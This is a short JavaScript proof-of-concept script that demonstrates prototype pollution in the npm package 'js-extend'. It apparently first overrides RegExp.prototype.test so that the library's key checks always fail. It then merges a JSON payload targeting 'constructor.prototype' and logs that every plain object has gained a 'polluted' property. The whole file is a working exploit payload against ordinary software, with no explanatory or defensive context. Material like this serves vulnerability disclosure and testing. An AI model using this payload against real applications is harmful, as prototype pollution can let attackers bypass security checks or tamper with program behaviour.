RegExp.prototype.test = () => false;
console.log({}.polluted);
const jsExtend = require('js-extend');
const malicious_payload = '{"constructor": {"prototype": {"polluted":"yes"}}}';
jsExtend.extend({}, JSON.parse(malicious_payload));
console.log({}.polluted);